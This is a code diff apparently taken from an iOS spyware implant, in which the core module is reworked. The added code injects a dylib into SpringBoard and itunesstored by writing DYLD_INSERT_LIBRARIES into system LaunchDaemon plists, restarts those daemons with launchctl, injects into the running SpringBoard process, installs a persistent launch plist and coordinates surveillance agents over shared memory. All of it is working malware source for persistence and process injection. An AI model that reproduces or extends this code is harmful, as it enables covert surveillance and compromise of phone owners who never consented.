@@ -31,15 +31,13 @@
 #import "NSData+SHA1.h"
 
 //#define DEBUG_
+//#define __DEBUG_IOS_DYLIB
 
 #pragma mark -
 #pragma mark Private Interface
 #pragma mark -
 
 extern kern_return_t injectDylibToProc(pid_t pid, const char *path);
-
-RCSISharedMemory  *mSharedMemoryCommand;
-RCSISharedMemory  *mSharedMemoryLogging;
 
 @interface RCSICore (hidden)
 
@@ -49,6 +47,10 @@ RCSISharedMemory  *mSharedMemoryLogging;
 - (BOOL)isBackdoorAlreadyResident;
 - (BOOL)shouldUpgradeComponents;
 - (BOOL)amIAlone;
+
+- (void)resetStatus:(UInt32)aStatus;
+- (void)setStatus:(UInt32)aStatus;
+- (BOOL)modulesAlreadyRestarting;
 
 @end
 
@@ -91,23 +93,66 @@ RCSISharedMemory  *mSharedMemoryLogging;
   return [rootObj writeToFile: BACKDOOR_DAEMON_PLIST atomically: NO];
 }
 
+- (BOOL)isDaemonPlistInjected:(NSString*)pathName
+{
+  NSData *plistData = [[NSFileManager defaultManager] contentsAtPath: pathName];
+  
+  if (plistData == nil)
+      return NO;
+  
+  NSMutableDictionary *plistDict = 
+  (NSMutableDictionary *)[NSPropertyListSerialization propertyListFromData: plistData 
+                                                          mutabilityOption: NSPropertyListMutableContainersAndLeaves 
+                                                                    format: nil  
+                                                          errorDescription: nil];
+  
+  if (plistDict == nil)
+    return NO;
+  
+  NSMutableDictionary *plistEnvDict = (NSMutableDictionary *)[plistDict objectForKey: @"EnvironmentVariables"];
+  
+  if (plistEnvDict == nil) 
+    {
+      return FALSE;
+    }
+  else 
+    {
+      NSString *envObjIn  = (NSString *) [plistEnvDict objectForKey: @"DYLD_INSERT_LIBRARIES"];
+      
+      if (envObjIn == nil) 
+        {
+          return FALSE;
+        }
+      else 
+        {
+          NSRange sbRange;
+          sbRange = [envObjIn rangeOfString: gDylibName options: NSCaseInsensitiveSearch]; 
+        
+          if (sbRange.location == NSNotFound)
+            return FALSE;
+          else
+            return TRUE;
+        }
+    }
+}
 
 - (BOOL)makeBackdoorResident
-{ 
-  NSString *sbPathname = @"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist";
-  NSString *itPathname = @"/System/Library/LaunchDaemons/com.apple.itunesstored.plist";
+{   
+  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
+    return TRUE;
   
   // Dylib injection
-  if (injectDylib(sbPathname) == NO)
+  if (injectDylib(SB_PATHNAME) == YES)
     {
-#ifdef DEBUG
-      errorLog(ME, @"error on dylib injection");
-#endif
+      [self launchCtl: "com.apple.SpringBoard.plist" command: "unload"];
+      usleep(500000);
+      [self launchCtl: "com.apple.SpringBoard.plist" command: "load"];
     }
   
-  if (injectDylib(itPathname) == YES) 
+  if (injectDylib(IT_PATHNAME) == YES) 
     {
       [self launchCtl: "com.apple.itunesstored.plist" command: "unload"];
+      usleep(500000);
       [self launchCtl: "com.apple.itunesstored.plist" command: "load"];
     }
   
@@ -116,37 +161,39 @@ RCSISharedMemory  *mSharedMemoryLogging;
 
 - (BOOL)isBackdoorAlreadyResident
 {
-  if ([[NSFileManager defaultManager] fileExistsAtPath: BACKDOOR_DAEMON_PLIST
-                                           isDirectory: NULL])
+  if ([[NSFileManager defaultManager] fileExistsAtPath:BACKDOOR_DAEMON_PLIST
+                                           isDirectory:NULL])
     return YES;
   else
     return NO;
 }
 
-- (BOOL)stopExternalModules
+- (BOOL)updateDylibConfigId
 {
-  BOOL retVal = FALSE;
-  NSMutableData *uninstCommand;
+  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEW_CONFID 
+                                                        status:1 
+                                                    attributes:0 
+                                                          blob:nil
+                                                      configId:[[RCSIConfManager sharedInstance] mConfigTimestamp]];
   
-  uninstCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
   
-  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[uninstCommand bytes];
-  shMemoryHeader->agentID         = OFFT_UNINSTALL;
-  shMemoryHeader->direction       = D_TO_AGENT;
-  shMemoryHeader->command         = AG_UNINSTALL;
-  shMemoryHeader->commandDataSize = [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding];
+  return TRUE;
+}
+
+- (BOOL)uninstallExternalModules
+{  
+  NSData *dylibName = [gDylibName dataUsingEncoding:NSUTF8StringEncoding];
   
-  memcpy(shMemoryHeader->commandData, 
-         [[gDylibName dataUsingEncoding: NSASCIIStringEncoding] bytes], 
-         [gDylibName lengthOfBytesUsingEncoding: NSASCIIStringEncoding]);
+  RCSIDylibBlob *tmpBlob = [[RCSIDylibBlob alloc] initWithType:DYLIB_NEED_UNINSTALL 
+                                                        status:1 
+                                                    attributes:0 
+                                                          blob:dylibName
+                                                      configId:0];
   
-  retVal = [mSharedMemoryCommand writeMemory: uninstCommand
-                                      offset: OFFT_UNINSTALL
-                               fromComponent: COMP_CORE];
-  
-  [uninstCommand release];
-  
-  return retVal;
+  [[RCSISharedMemory sharedInstance] writeIpcBlob: [tmpBlob blob]];
+    
+  return TRUE;
 }
 
 - (void)uninstallMeh
@@ -156,7 +203,7 @@ RCSISharedMemory  *mSharedMemoryLogging;
   NSString *dylibPathname = 
   [[NSString alloc] initWithFormat: @"%@/%@", @"/usr/lib", gDylibName];
   
-  [self stopExternalModules];
+  [self uninstallExternalModules];
   
   removeDylibFromPlist(sbPathname);
   removeDylibFromPlist(itPathname);
@@ -230,6 +277,7 @@ RCSISharedMemory  *mSharedMemoryLogging;
     
       // Forcing a SpringBoard reload
       [self launchCtl:"com.apple.SpringBoard.plist" command:"unload"];
+      usleep(500000);
       [self launchCtl:"com.apple.SpringBoard.plist" command:"load"];
     }
   
@@ -293,7 +341,7 @@ RCSISharedMemory  *mSharedMemoryLogging;
 }
 
 #pragma mark -
-#pragma mark Main runloop
+#pragma mark Message handling
 #pragma mark -
 
 typedef struct _coreMessage_t
@@ -301,6 +349,12 @@ typedef struct _coreMessage_t
   mach_msg_header_t header;
   uint dataLen;
 } coreMessage_t;
+
+- (void)refreshRemoteBlobs:(NSData*)aMessage
+{
+  shMemoryLog *message = (shMemoryLog *)[aMessage bytes];
+  [[RCSISharedMemory sharedInstance] refreshRemoteBlobsToPid: message->flag];
+}
 
 - (void)dispatchToLogManager:(NSData*)aMessage
 {
@@ -339,25 +393,6 @@ typedef struct _coreMessage_t
     }
 }
 
-- (void)setStatus:(UInt32)aStatus
-{
-  moduleStatus |= aStatus;
-}
-
-- (void)resetStatus:(UInt32)aStatus
-{
-  moduleStatus &= ~(aStatus);
-}
-
-- (BOOL)modulesAlreadyRestarting
-{
-  if (!(moduleStatus & CORE_STOPPING_STAT) && 
-      ((moduleStatus & MODULES_RELOAD_STAT) == 0))
-    return FALSE;
-  else
-    return TRUE;
-}
-
 - (void)broadcastUninstall
 {
   shMemoryLog reload;
@@ -380,23 +415,26 @@ typedef struct _coreMessage_t
       [self dispatchToEventManager:  aMessage];
       [self dispatchToActionManager: aMessage];
       [self dispatchToAgentManager:  aMessage];
-      [self setStatus: MODULES_RELOAD_STAT];
+    
+      [self updateDylibConfigId];
+    
+      [self setStatus: CORE_STATUS_RELOAD];
     }
   else if (aFlag == CORE_ACTION_STOPPED)
     {
-      [self resetStatus: ACTION_MANAGER_RUN];
+      [self resetStatus: CORE_STATUS_AM_RUN];
     }
   else if (aFlag == CORE_EVENT_STOPPED)
     {
-      [self resetStatus:  EVENT_MANAGER_RUN];
+      [self resetStatus:  CORE_STATUS_EM_RUN];
     }
   else if (aFlag == CORE_AGENT_STOPPED)
     {
-      [self resetStatus:  AGENT_MANAGER_RUN];
+      [self resetStatus:  CORE_STATUS_MM_RUN];
     }
   else if (aFlag == ACTION_DO_UNINSTALL)
     {
-      [self setStatus: CORE_STOPPING_STAT];
+      [self setStatus: CORE_STATUS_STOPPING];
       [self broadcastUninstall];
     }
 }
@@ -410,8 +448,6 @@ typedef struct _coreMessage_t
   
   switch (message->agentID)
   {
-    case EVENT_CAMERA_APP:
-    case EVENT_STANDBY:
     case EVENT_SIM_CHANGE:
     case EVENT_TRIGGER_ACTION:
     {
@@ -428,6 +464,8 @@ typedef struct _coreMessage_t
     }
     case ACTION_EVENT_ENABLED:
     case ACTION_EVENT_DISABLED:
+    case EVENT_STANDBY:
+    case EVENT_CAMERA_APP:
     {
       if ([self modulesAlreadyRestarting] == FALSE)
         [self dispatchToEventManager: aMessage];
@@ -448,6 +486,11 @@ typedef struct _coreMessage_t
                        withMessage:aMessage];
       break;
     }
+    case DYLIB_CONF_REFRESH:
+    {
+      [self refreshRemoteBlobs:aMessage];
+      break;
+    }
   }
 }
 
@@ -455,7 +498,7 @@ typedef struct _coreMessage_t
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSMutableArray *messages = [mSharedMemoryLogging fetchMessages];
+  NSMutableArray *messages = [[RCSISharedMemory sharedInstance] fetchMessages];
   
   int msgCount = [messages count];
   
@@ -467,6 +510,29 @@ typedef struct _coreMessage_t
   return msgCount;
 }
 
+#pragma mark -
+#pragma mark Modules management
+#pragma mark -
+
+- (void)setStatus:(UInt32)aStatus
+{
+  moduleStatus |= aStatus;
+}
+
+- (void)resetStatus:(UInt32)aStatus
+{
+  moduleStatus &= ~(aStatus);
+}
+
+- (BOOL)modulesAlreadyRestarting
+{
+  if (!(moduleStatus & CORE_STATUS_STOPPING) && 
+      ((moduleStatus & CORE_STATUS_RELOAD) == 0))
+    return FALSE;
+  else
+    return TRUE;
+}
+
 - (BOOL)startEventManager
 {
   [eventManager release];
@@ -475,7 +541,7 @@ typedef struct _coreMessage_t
 
   if ([eventManager start] == TRUE)
     {
-      [self setStatus: EVENT_MANAGER_RUN];
+      [self setStatus: CORE_STATUS_EM_RUN];
       return TRUE;
     }
   else 
@@ -490,7 +556,7 @@ typedef struct _coreMessage_t
   
   if ([actionManager start] == TRUE)
     {  
-      [self setStatus: ACTION_MANAGER_RUN];
+      [self setStatus: CORE_STATUS_AM_RUN];
       return TRUE;
     }
   else
@@ -505,22 +571,19 @@ typedef struct _coreMessage_t
   
   if ([agentManager start] == TRUE)
     {  
-      [self setStatus: AGENT_MANAGER_RUN];
+      [self setStatus: CORE_STATUS_MM_RUN];
       return TRUE;
     }
   else
     return FALSE;
 }
 
-#define MODULES_FLAGS 0x7
-
 - (BOOL)shouldRestartModules
 {
   BOOL retVal = FALSE;
   
-  if (!(moduleStatus  & CORE_NEED_STOP) &&
-       (moduleStatus  & MODULES_RELOAD_STAT) &&
-       ((moduleStatus & MODULES_FLAGS) == 0))
+  if ((moduleStatus  & CORE_STATUS_RELOAD) &&
+      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
     retVal = TRUE;
   
   return retVal;
@@ -530,18 +593,25 @@ typedef struct _coreMessage_t
 {
   BOOL retVal = FALSE;
   
-  if ((moduleStatus  & CORE_STOPPING_STAT) &&
-      ((moduleStatus & MODULES_FLAGS) == 0))
+  if ((moduleStatus  & CORE_STATUS_STOPPING) &&
+      ((moduleStatus & CORE_STATUS_MDLS_BITS) == CORE_STATUS_MDLS_ALL_STOPPED))
     retVal = TRUE;
   
   return retVal;
 }
+
+#pragma mark -
+#pragma mark Main runloop
+#pragma mark -
 
 - (BOOL)checkAndinjectSB
 {
   BOOL bRet = TRUE;
   char dylibname[256];
   char dylbPathname[256];
+  
+  if ([self isDaemonPlistInjected: SB_PATHNAME] == TRUE)
+    return TRUE;
   
   pid_t sb_pid = getPidByProcessName(@"SpringBoard");
   
@@ -561,6 +631,9 @@ typedef struct _coreMessage_t
   return bRet;
 }
 
+/*
+ * invoked by timer
+ */
 - (void)checkAndinjectSB:(NSTimer*)theTimer
 {
   [self checkAndinjectSB];
@@ -568,6 +641,10 @@ typedef struct _coreMessage_t
 
 - (void)injectSpringBoard
 {
+#ifdef __DEBUG_IOS_DYLIB
+  return;
+#endif
+  
   if ([self checkAndinjectSB] == TRUE)
     {
       NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: 10.0 
@@ -581,7 +658,6 @@ typedef struct _coreMessage_t
     }
   else
     {
-      // XXX- check if already envs injected!
       [self makeBackdoorResident];
     }
 }
@@ -604,8 +680,8 @@ typedef struct _coreMessage_t
   createInfoLog(@"Start");
   
   [self injectSpringBoard];
-   
-  while ([self mMainLoopControlFlag] == CORE_RUNNING)
+  
+  while ([self mMainLoopControlFlag] != CORE_STOPPED)
     {
       NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
           
@@ -616,11 +692,13 @@ typedef struct _coreMessage_t
       // first run and every new conf received
       if ([self shouldRestartModules] == TRUE)
         {
+          [[RCSISharedMemory sharedInstance] delBlobs];
+        
           if ([self startAgentManager]  == TRUE &&
               [self startActionManager] == TRUE && 
               [self startEventManager]  == TRUE)
             {
-              [self resetStatus: MODULES_RELOAD_STAT];
+              [self resetStatus: CORE_STATUS_RELOAD];
             }
           else
             {
@@ -631,13 +709,11 @@ typedef struct _coreMessage_t
         {
           // all modules flags are resetted
           //    -> modulesStatus = CORE_STOPPING_STAT
-          [self setMMainLoopControlFlag: CORE_STOPPING];
+          [self setMMainLoopControlFlag: CORE_STOPPED];
         }
     
       [pool release];
     }
-
-  mMainLoopControlFlag = CORE_STOPPED;
   
   // clean all and exit
   [self uninstallMeh];
@@ -655,14 +731,14 @@ typedef struct _coreMessage_t
 @synthesize mUtil;
 @synthesize mSBPid;
 
-- (id)initWithShMemorySize:(int)aSize
+- (id)init
 {
   self = [super init];
   
   if (self != nil)
     {
       mMainLoopControlFlag  = CORE_RUNNING;
-      moduleStatus          = MODULES_RELOAD_STAT;
+      moduleStatus          = CORE_STATUS_RELOAD;
       eventManager          = nil;
       actionManager         = nil;
       agentManager          = nil;
@@ -670,24 +746,8 @@ typedef struct _coreMessage_t
       mSBPid                = -1;
     
       [self _guessNames];
-    
-      mSharedMemoryCommand = 
-          [[RCSISharedMemory alloc] initWithFilename: SH_COMMAND_FILENAME
-                                                size: aSize];
-      
-      mSharedMemoryLogging = 
-          [[RCSISharedMemory alloc] initWithFilename: SH_LOG_FILENAME
-                                                size: SHMEM_LOG_MAX_SIZE];
-                                                               
-      NSString *loaderPath = 
-          [[NSString alloc] initWithFormat: @"%@/%@",
-                                            [[NSBundle mainBundle] bundlePath],
-                                            @"srv.sh"];
-
-      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]
-                                        serviceLoader: loaderPath];
-      
-      [loaderPath release];
+   
+      mUtil = [[RCSIUtils alloc] initWithBackdoorPath: [[NSBundle mainBundle] bundlePath]];
     }
   
   return self;
@@ -695,11 +755,7 @@ typedef struct _coreMessage_t
 
 - (void)dealloc
 {
-  [mSharedMemoryCommand release];
-  [mSharedMemoryLogging release];
-  
   [mUtil release];
-  
   [super dealloc];
 }
 
@@ -716,20 +772,11 @@ typedef struct _coreMessage_t
   getSystemVersion(&gOSMajor, &gOSMinor, &gOSBugFix);
 
   [self shouldUpgradeComponents];
-  
-  // shared memory for commands
-  if ([mSharedMemoryCommand createMemoryRegion] == -1)
-    return NO;    
-  if ([mSharedMemoryCommand attachToMemoryRegion: YES] == -1)
-    return NO;
-  [mSharedMemoryCommand zeroFillMemory];
 
-  [mSharedMemoryLogging createCoreRLSource];
+  [[RCSISharedMemory sharedInstance] createCoreRLSource];
   
   if ([self isBackdoorAlreadyResident] == FALSE)
-    {
       [self createLaunchAgentPlist];
-    }
 
   [self coreRunLoop];
   
